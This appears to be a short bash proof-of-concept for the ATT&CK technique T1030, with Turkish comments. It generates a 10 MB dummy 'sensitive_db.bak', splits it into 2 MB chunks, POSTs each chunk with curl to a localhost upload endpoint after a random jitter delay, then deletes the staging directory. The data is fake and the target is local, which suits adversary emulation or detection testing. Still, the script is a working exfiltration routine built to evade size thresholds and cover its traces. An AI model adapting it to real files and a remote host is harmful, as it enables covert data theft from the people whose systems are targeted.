#!/bin/bash
#T1030 - Data Transfer Size Limits PoC (Linux)

echo "Exfiltration basliyor..."

#Staging
STAGING_DIR="/tmp/exfil_staging"
DUMMY_DATA="$STAGING_DIR/sensitive_db.bak"

mkdir -p "$STAGING_DIR"
# urandom kullanarak dummy data uret
dd if=/dev/urandom of="$DUMMY_DATA" bs=1M count=10 2>/dev/null
echo "Sızdırılıcak dosya hazırlandı: $DUMMY_DATA"

#Chunking
echo "Dosya parcalara bolunuyor..."
split -b 2M "$DUMMY_DATA" "$STAGING_DIR/chunk_"

#xfiltration

for chunk in "$STAGING_DIR"/chunk_*; do
    #Random jitter
    JITTER=$((RANDOM % 3 + 1))
    
    echo " -> $chunk gonderiliyor... (Bekleme: $JITTER sn)"
    
    #Cikimsi
    curl -s -X POST --data-binary @"$chunk" http://127.0.0.1:8000/upload
    
    sleep "$JITTER"
done

echo "Exfiltration tamamlandi."

#Temizlik
rm -rf "$STAGING_DIR"